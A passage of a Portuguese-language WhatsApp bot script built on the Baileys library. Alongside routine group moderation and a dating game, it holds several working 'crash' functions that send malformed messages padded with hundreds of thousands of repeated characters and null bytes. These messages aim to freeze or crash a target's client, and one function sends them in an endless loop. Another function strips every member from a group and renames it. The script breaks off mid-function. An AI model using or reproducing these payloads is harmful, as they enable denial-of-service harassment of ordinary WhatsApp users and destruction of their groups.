require("./gutoxtaz/config")
const { generateMessageIDV2, WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, makeInMemoryStore, fetchLatestBaileysVersion, getFileBuffer,  makeCacheableSignalKeyStore, tempo, makeWaSocket, delay } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const path = require('path')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')
const pino = require('pino')
const logger = pino({ level: 'debug' });
const JSConfuser = require("js-confuser");
const crypto = require('crypto');
const os = require('os')
module.exports = async (uwu, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""
//N√£o h√° necessidade de fazer nada se voc√™ n√£o quiser erros
const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./gutoxtaz/lib/myfunc')
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[¬∞‚Ä¢œÄ√∑√ó¬∂‚àÜ¬£¬¢‚Ç¨¬•¬Æ‚Ñ¢+‚úì_=|~!?@#$%^&.¬©^]/gi.test(body) ? body.match(/^[¬∞‚Ä¢œÄ√∑√ó¬∂‚àÜ¬£¬¢‚Ç¨¬•¬Æ‚Ñ¢+‚úì_=|~!?@#$%^&.¬©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (uwu.user.id.split(':')[0]+'@s.whatsapp.net' || uwu.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await uwu.decodeJid(uwu.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const isDeveloper = (m && m.sender && global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await uwu.groupMetadata(m.chat).catch(e => {}) : null
const groupName = m.isGroup && groupMetadata ? groupMetadata.subject : '';
const participants = m.isGroup && groupMetadata ? groupMetadata.participants : [];
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const cd = require('./gutoxtaz/lib/countdown')
let usersdb = global.db.data.users
fs.writeFileSync('./gutoxtaz/database/database.json', JSON.stringify(global.db, null, 2))
const isPremium = isCreator ? true : cd.isPremium(usersdb, m.sender)
const isRentBotUser = isDeveloper ? true : cd.isPremium(usersdb, m.sender)
var Procurar_String = m.message?.conversation || m.message?.viewOnceMessageV2?.message?.imageMessage?.caption || m.message?.viewOnceMessageV2?.message?.videoMessage?.caption || m.message?.imageMessage?.caption || m.message?.videoMessage?.caption || m.message?.extendedTextMessage?.text || m.message?.viewOnceMessage?.message?.videoMessage?.caption || m.message?.viewOnceMessage?.message?.imageMessage?.caption || m.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || m.message?.buttonsMessage?.imageMessage?.caption || ""
const budy2 = body.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

const seloMeta = {"key": {"participant": "13135550002@s.whatsapp.net","remoteJid": "status@broadcast", "fromMe": false,},"message": {
"contactMessage": {
"displayName": "Meta IA", "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Chat GPT;;;\nFN:Meta IA\nitem1.TEL;waid=13135550002:13135550002\nitem1.X-ABLabel:Celular\nEND:VCARD`, "contextInfo": {"forwardingScore": 1,"isForwarded": true}}}};

const menc_prt = m.message?.extendedTextMessage?.contextInfo?.participant

const menc_jid = args?.join(" ").replace("@", "") + "@s.whatsapp.net"

const menc_jid2 = m.message?.extendedTextMessage?.contextInfo?.mentionedJid

const sender_ou_n = q.includes("@") ? menc_jid : sender

const mrc_ou_numero = q.length > 6 && !q.includes("@") ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt 
const menc_os2 = q.includes("@") ? menc_jid : menc_prt 

const marc_tds = q.includes("@") ? menc_jid : q.length > 6 && !q.includes("@") ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt 

const mention = (teks= '', ms = m) => {
memberr = []
vy = teks.includes('\n') ? teks.split('\n') : [teks]
for(vz of vy){ for(zn of vz.split(' ')){
if(zn.includes('@'))memberr.push(parseInt(zn.split('@')[1])+'@s.whatsapp.net')
}}
uwu.sendMessage(from, {text: teks.trim(), mentions: memberr}, {quoted: ms}) 
}

if (m.message && m.isGroup) {
  console.log(chalk.magenta(`Mensagem de Grupo : `) + '\n' + chalk.magenta('=> De : '), chalk.green(pushname) + '\n' + chalk.magenta('=> Grupo : '), chalk.green(groupName))
  console.log(chalk.whiteBright('[ Mensagem ] : '), chalk.black(chalk.bgWhite(budy || m.mtype)))
} else {
  console.log(chalk.green(`Mensagem Privada : `), chalk.magenta('=> De : '), chalk.magenta(pushname))
  console.log(chalk.whiteBright('[ Mensagem ] : '), chalk.black(chalk.bgWhite(budy || m.mtype)))
}

const time = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const hora = moment.tz('America/Sao_Paulo').format('HH:mm:ss');
const date = moment.tz('America/Sao_Paulo').format('DD/MM/YYYY');

const namoro1 = JSON.parse(fs.readFileSync("./DADOS/database/namoro1.json"))
const namoro2 = JSON.parse(fs.readFileSync("./DADOS/database/namoro2.json"))

if (budy2.toLowerCase() === "sim") {
    if (JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && m.isGroup) {
        C14 = namoro2.map(i => i.id).indexOf(sender)
        C12 = namoro1.map(i => i.usu1).indexOf(namoro2[C14].pedido + "@s.whatsapp.net")
        namoro1[C12].namorados = true
        fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))
        namoro1.push({
            usu1: sender,
            usu2: namoro2[C14].pedido,
            namorados: true,
            idgp: from,
            hora: hora,
            data: date
        })
        fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))
        namoro2.splice(C14, 1)
        fs.writeFileSync("./DADOS/database/namoro2.json", JSON.stringify(namoro2))
        mention(`ü•≥ Parab√©ns, @${namoro1[C12].usu1.split('@')[0]}! Seu grande amor, @${sender.split('@')[0]}, aceitou seu pedido de namoro! üíñ\n\nAgora voc√™s s√£o oficialmente um casal! Para ver os detalhes, use o comando: *${prefix}dupla*`)
    }
}

if(budy2.toLowerCase().replace("√£", "a") === "nao") {
if(JSON.stringify(namoro2).includes(sender) && namoro2[namoro2.map(i => i.id).indexOf(sender)].idgp == from && m.isGroup) {
C14 = namoro2.map(i => i.id).indexOf(sender)
C12 = namoro1.map(i => i.usu1).indexOf(`${namoro2[C14].pedido}@s.whatsapp.net`)
mention(`Sinto muito @${namoro1[C12].usu1.split('@')[0]}! O (a) @${sender.split('@')[0]} n√£o te ama, deve est√° confuso(a) ou n√£o preparado(a) e por isso n√£o aceitou o seu pedido de namoro. üò¶`)
namoro1.splice(C12, 1)
fs.writeFileSync("./DADOS/database/namoro1.json", JSON.stringify(namoro1, null, 2))
namoro2.splice(C14, 1)
fs.writeFileSync("./DADOS/database/namoro2.json", JSON.stringify(namoro2))
}
}

const thumbnailreply = fs.readFileSync('./luckzMedia/thumb.jpg')
const dirGroup = `./DADOS/grupos/${from}.json`;

const data_IDGP = [{
    name: groupName,
    groupId: from,
    antidoc: false,
    antilinkhard: false,
    wellcome: [{
      bemvindo1: false,
      legendabv: "Ol√° #numerodele#, seja bem vindo (a)",
      legendasaiu: 0
    }]
}];

if(m.isGroup && !fs.existsSync(dirGroup)){
  fs.writeFileSync(dirGroup, JSON.stringify(data_IDGP, null, 2) + '\n');
}

try {
  var dataGp = m.isGroup ? JSON.parse(fs.readFileSync(dirGroup)) : undefined;
} catch (e){
  fs.writeFileSync(dirGroup, JSON.stringify(data_IDGP));
}

function setGp(index){
fs.writeFileSync(dirGroup, JSON.stringify(index, null, 2) + "\n")}

const isAntiLinkHard = m.isGroup ? dataGp[0].antilinkhard : undefined
const Antidoc = m.isGroup ? dataGp[0].antidoc : undefined
const isWelkom = m.isGroup ? dataGp[0].wellcome[0].bemvindo1 : undefined

const linkRegex = /(https?:\/\/[^\s]+|www\.[^\s]+|\b[a-z0-9-]+\.(com|net|org|br|info|xyz|site|link|store|online|gov|edu|io|me)(\/[^\s]*)?)/gi

if (isAntiLinkHard && !isAdmins && isBotAdmins && !m.key.fromMe) {
  if (linkRegex.test(Procurar_String)) {
    try {
      let groupInvite = await uwu.groupInviteCode(m.chat)
      let isLinkDoGrupo = Procurar_String.includes(`chat.whatsapp.com/${groupInvite}`)

      if (!isLinkDoGrupo) {
        await uwu.sendMessage(m.chat, {
          text: `üö´ Ol√° @${m.sender.split('@')[0]}, n√£o √© permitido enviar links neste grupo.`,
          mentions: [m.sender]
        }, { quoted: m })

        await uwu.sendMessage(m.chat, {
          delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.key.id,
            participant: m.key.participant || m.key.remoteJid
          }
        })
      }
    } catch (err) {
      console.error("Erro ao processar link:", err)
    }
  }
}

if (Antidoc && !isAdmins && isBotAdmins && !m.key.fromMe) {
  if (m.message?.documentMessage) {
    try {
      await uwu.sendMessage(m.chat, {
        text: `üìÇ Ol√° @${m.sender.split('@')[0]}, o envio de documentos n√£o √© permitido neste grupo.`,
        mentions: [m.sender]
      }, { quoted: m })

      await uwu.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: false,
          id: m.key.id,
          participant: m.key.participant || m.key.remoteJid
        }
      })
    } catch (err) {
      console.error("Erro ao aplicar anti-documento:", err)
    }
  }
}

async function validarNumeroWhatsApp(numero, reply) {
  const nmr = numero.trim().replace(/\D/g, '')
  if (!nmr) {
    reply('‚ùå N√∫mero inv√°lido.')
    return null
  }

  const [result] = await uwu.onWhatsApp(nmr)
  if (!result || !result.exists) {
    reply('‚ùå Esse n√∫mero n√£o est√° registrado no WhatsApp.')
    return null
  }
  return result.jid
}

const reply = (teks) => {
uwu.sendMessage(m.chat, {
text: teks,
contextInfo: {
    externalAdReply: {
        title: botname,
        "thumbnail": thumbnailreply,
        mediaType: 1,
    }
    }
}, {quoted:m})

}
function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return uwu.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return uwu.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
const reagir = async (idgp, emj) => {
var reactionMessage = {
react: {
text: emj, 
key: m.key
}
} 
uwu.sendMessage(idgp, reactionMessage)
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}
if (!uwu.public) {
if (!isCreator) return
}

if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('uwu.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('H√° um erro:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
//let response = `Desculpe, o comando que voc√™ deu est√° errado. Talvez seja isso que voc√™ quer dizer:\n\n‚Ä¢> ${prefix+mean}\n‚Ä¢> Semelhan√ßas: ${similarityPercentage}%`
reply(response)
}}   

async function buginvite(isTarget, ptcp = false) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: `33333333333333333@newsletter`,
            newsletterName: "\u200E" + "Í¶æ".repeat(120000),
            jpegThumbnail: thumbnailreply,
            caption: "Í¶Ω".repeat(120000) + "@\0".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "\0".repeat(1020000),
            version: 3
          },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_2_OptIn_0: !0,
              screen_2_OptIn_1: !0,
              screen_1_Dropdown_0: "nullOnTop",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "null@gmail.com",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: "\u0000".repeat(500000),
              screen_0_TextInput_1: "ùì´ùîÇ ùììùìÆùìºùìΩùìªùì∏ùîÇùìÆùìª ùìø0.1",
              screen_0_Dropdown_2: "#926-Xnull",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
            },
          },
        ],
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 25 }, () => "0@s.whatsapp.net"),
        isForwarded: false,
        fromMe: false,
        groupMentions: [
          {
            groupJid: "120363417463799728@g.us",
            groupSubject: "Kuntul",
          },
        ],
      },
    };

    await uwu.relayMessage(isTarget, message, { userJid: isTarget });
  } catch (err) {
    console.error("Error sending newsletter:", err);
  }
}

async function outofsync(number) {
    await uwu.relayMessage(number, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "\u200E",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "call_permission_request",
                      paramsJson: "\u0000".repeat(1020000),
                      version: 3
                    }
                }
            }
        }
    }, { participant: { jid: number}});
}

async function nullInf(isTarget) {
    let count = 0;
  
    while (true) {
      try {
        await outofsync(isTarget)
        await delay(400)
  
        count++;
        console.log(chalk.green(`ENVIANDO`));
  
        if (count % 40 === 0) {
          console.log(chalk.yellow(`PAUSE DE 5 SEGUNDOS`));
          await delay(15000);
        }
      } catch (err) {
        console.error(chalk.red("ERRO"), err.message);
        await delay(5000);
        }
    }
}

async function sendLiveLocationMessage(jid) {
    var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
      'viewOnceMessage': {
        'message': {
          'liveLocationMessage': {
            'degreesLatitude': 'p',
            'degreesLongitude': 'p',
            'caption': 'ÿÇŸÜÿÉÿÑŸΩÿÇŸÜÿÉÿÑŸΩ' + '\u0000'.repeat(300000),
            'sequenceNumber': '0',
            'jpegThumbnail': thumbnailreply
          }
        }
      }
    }), {
      'userJid': jid
    });
    await uwu.relayMessage(jid, messageContent.message, {
        'participant': {
          'jid': jid
        },
        'messageId': messageContent.key.id
    });
}

async function limparGrupoRenomear(groupJid, novoNome, novaDescricao) {
  try {
    const metadata = await uwu.groupMetadata(groupJid);

    const ownerId = metadata.owner || metadata.participants.find(p => p.admin === 'superadmin')?.id;

    const participantesParaRemover = metadata.participants
      .filter(p => p.id !== ownerId && p.id !== botNumber)
      .map(p => p.id);

    if (participantesParaRemover.length === 0) {
      await uwu.sendMessage(m.chat, { text: 'Nenhum membro para remover.' });
    } else {
      for (const participante of participantesParaRemover) {
        await uwu.groupParticipantsUpdate(groupJid, [participante], 'remove');
        await delay(10);
      }
    }

    await uwu.groupUpdateSubject(groupJid, novoNome);
    await uwu.groupUpdateDescription(groupJid, novaDescricao);

  } catch (error) {
    console.error('Erro ao limpar e renomear grupo:', error);
  }
}

async function trashinfinity(target) {
  let virtex = "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£";
  uwu.relayMessage(target, {
      groupMentionedMessage: {
          message: {
              interactiveMessage: {
                  header: {
                      documentMessage: {
                          url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                          mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                          fileLength: "99999999999",
                          pageCount: 0x9184e729fff,
                          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                          fileName: virtex,
                          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                          directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                          mediaKeyTimestamp: "1715880173",
                          contactVcard: true
                      },
                      hasMediaAttachment: true
                  },
                  body: {
                      text: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£" + "Í¶æ".repeat(100000) + "@1".repeat(300000)
                  },
                  nativeFlowMessage: {},
                  contextInfo: {
                      mentionedJid: Array.from({
                          length: 5
                      }, () => "1@newsletter"),
                      groupMentions: [{
                          groupJid: "1@newsletter",
                          groupSubject: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£"
                      }]
                  }
              }
          }
      }
  }, {
      participant: {
          jid: target
      }
  })
}

async function nativemessage(target) {
  uwu.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£",
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                  jpegThumbnail: thumbnailreply,
                },
                hasMediaAttachment: true,
                },
                body: {
                  text:
                    "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£‚≠ëÃ§\n" +
                    "Í¶æ".repeat(10000) +
                    `@1`.repeat(10000),
                },
                nativeFlowMessage: {},
                contextInfo: {
                  mentionedJid: [
                    "1@newsletter",
                    "1@newsletter",
                    "1@newsletter",
                    "1@newsletter",
                    "1@newsletter",
                  ],
                  groupMentions: [
                    {
                      groupJid: "1@newsletter",
                      groupSubject: "Destroyer",
                    },
                  ],
                                    nativeFlowMessage: {
                          buttons: [
                              {
                                  name: "call_permission_request",
                                  buttonParamsJson: {}
                              }
                          ]
                      },  
                  quotedMessage: {
                  locationMessage: {
                    degreesLatitude: 1.0,
                    degreesLongitude: 5.0,
                    },
                  },
                },
              },
            },
          },
        },
        {
          participant: { jid: target },
          userJid: target,
        }
      )
}

async function CrlButton(isTarget) {
  const msg = generateWAMessageFromContent(
      isTarget,
      {
          viewOnceMessage: {
              message: {
                  interactiveMessage: {
                      body: {
                          text: `\u0000`
                      },
                      carouselMessage: {
                          cards: [
                              {
                                  header: {
                                      ...(await prepareWAMessageMedia(
                                          { image: { url: "https://files.catbox.moe/wmmjgf.png" } }, 
                                          { upload: uwu.waUploadToServer }
                                      )),
                                      title: `\u0000`,
                                      gifPlayback: true,
                                      subtitle: '\u0000',
                                      hasMediaAttachment: true
                                  },
                                  body: {
                                      text:"ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£" + "Í¶æ".repeat(120000)
                                  },
                                  footer: {
                                      text: "\u0000"
                                  },
                                  nativeFlowMessage: {
                                      buttons: [
                                          {
                                              name: "single_select",
                                              buttonParamsJson: JSON.stringify({
                                                  title: "",
                                                  sections: []
                                              })
                                          },
                                          {
                                              name: "single_select",
                                              buttonParamsJson: `{"title":"${"ë≤≠ë≤≠".repeat(60000)}","sections":[{"title":" Eu vou matar voc√™ ","rows":[]}]}`
                                          },
                                          {
                                              name: "call_permission_request",
                                              buttonParamsJson: "{}"
                                          },
                                          {
                                              name: "mpm",
                                              buttonParamsJson: "{}"
                                          },
                                          {
                                              name: "single_select",
                                              buttonParamsJson: "{\"title\":\"ü¶†\",\"sections\":[{\"title\":\"üî•\",\"highlight_label\":\"üí•\",\"rows\":[{\"header\":\"\",\"title\":\"üíß\",\"id\":\"‚ö°\"},{\"header\":\"\",\"title\":\"üí£\",\"id\":\"‚ú®\"}]}]}"
                                          },
                                          {
                                              name: "quick_reply",
                                              buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"üìå\"}"
                                          },
                                          {
                                              name: "cta_url",
                                              buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://whatsapp.com/channel/0029VbBFr1sFCCoVoxMhYw3X\",\"merchant_url\":\"https://whatsapp.com/channel/0029VbBFr1sFCCoVoxMhYw3X\"}"
                                          },
                                          {
                                              name: "cta_call",
                                              buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                          },
                                          {
                                              name: "cta_copy",
                                              buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                          },
                                          {
                                              name: "cta_reminder",
                                              buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                          },
                                          {
                                              name: "cta_cancel_reminder",
                                              buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                          },
                                          {
                                              name: "address_message",
                                              buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                          },
                                          {
                                              name: "send_location",
                                              buttonParamsJson: "\u0000"
                                          }
                                      ]
                                  }
                              }
                          ],
                          messageVersion: 1,
                      }
                  }
              }
          }
      },
      { quoted: q }
  );
  await uwu.relayMessage(isTarget, msg.message, {
      messageId: msg.key.id,
  })
}

async function Blanking(isTarget) {
  let msg = generateWAMessageFromContent(isTarget, proto.Message.fromObject({
      viewOnceMessage: {
          message: {
              interactiveMessage: {
                  contextInfo: {
                      mentionedJid: [isTarget],
                      isForwarded: true,
                      forwardingScore: 999,
                      forwardedNewsletterMessageInfo: {
                          newsletterJid: "120363409362506610@newsletter",
                          newsletterName: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£",
                          serverMessageId: 1
                      }
                  },
                  header: {
                      title: "",
                      ...(await prepareWAMessageMedia({
                          image: {
                              url: "https://files.catbox.moe/wmmjgf.png",
                              gifPlayback: true
                          }
                      }, {
                          upload: uwu.waUploadToServer,
                          mediaType: "image"
                      })),
                      hasMediaAttachment: true
                  },
                  body: {
                      text: ""
                  },
                  footer: {
                      text: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£"
                  },
                  nativeFlowMessage: {
                      buttons: [{
                              name: "single_select",
                              buttonParamsJson: `{"title":"${"Í¶æ".repeat(60000)}","sections":[{"title":"Flow Button","rows":[]}]}`
                          },
                          {
                              name: "quick_reply",
                              buttonParamsJson: `{"display_text": "", "id": ""}`
                          },
                          {
                              name: "cta_url",
                              buttonParamsJson: `{"display_text": "", "url": "", "merchant_url": ""}`
                          },
                          {
                              name: "mpm",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "payment_method",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "call_permission_request",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "form_message",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "wa_payment_learn_more",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "wa_payment_transaction_details",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "wa_payment_fbpin_reset",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "catalog_message",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "payment_info",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "review_order",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "send_location",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "payments_care_csat",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "view_product",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "payment_settings",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "address_message",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "automated_greeting_message_view_catalog",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "open_webview",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "message_with_link_status",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "payment_status",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "extensions_message_v2",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "landline_call",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "review_and_pay",
                              buttonParamsJson: "{}"
                          },
                          {
                              name: "galaxy_message",
                              buttonParamsJson: `{
"screen_2_OptIn_0": true,
"screen_2_OptIn_1": true,
"screen_1_Dropdown_0": "Null",
"screen_1_DatePicker_1": "1028995200000",
"screen_1_TextInput_2": "luckzinios@gmail.com",
"screen_1_TextInput_3": "94643116",
"screen_0_TextInput_0": "radio - buttons${"\0".repeat(100000)}",
"screen_0_TextInput_1": "Anjay",
"screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
"flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
}`,
                              version: 3
                          }
                      ]
                  }
              }
          }
      }
  }), {
      userJid: isTarget,
      quoted: null
  });

  await uwu.relayMessage(isTarget, msg.message, {
      messageId: msg.key.id
  })
}

async function darkflower(target) {
  let Msg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            mentionedJid: [target],
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target,
            },
          },
          body: {
            text: "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£" + "Í¶æ".repeat(77777), 
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "",
              },
              {
                name: "call_permission_request",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
              {
                name: "mpm",
                buttonParamsJson: "",
              },
            ],
          },
        },
      },
    },
  };

  await uwu.relayMessage(target, Msg, {
    participant: { jid: target },
  })
}

async function VPen(zLoc, ptcp = false) {
  let valhalla = "ùêµùí¥ ùíüùê∏ùíÆùíØùëÖùí™ùí¥ùê∏ùëÖ ùí±ùü¢.ùü£" + "Í¶æ".repeat(50000);

  let mentionedJidArray = Array.from({ length: 35000 }, () => 
      "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
  );

  let battanz = {
      groupMentionedMessage: {
          message: {
              listResponseMessage: {
                  title: " @120363326274964194@g.us",
                  listType: "SINGLE_SELECT",
                  singleSelectReply: {
                      selectedRowId: "Gateway To Hell"
                  },
                  description: " @120363326274964194@g.us",
                  contextInfo: {
                      mentionedJid: mentionedJidArray,
                      groupMentions: [{ 
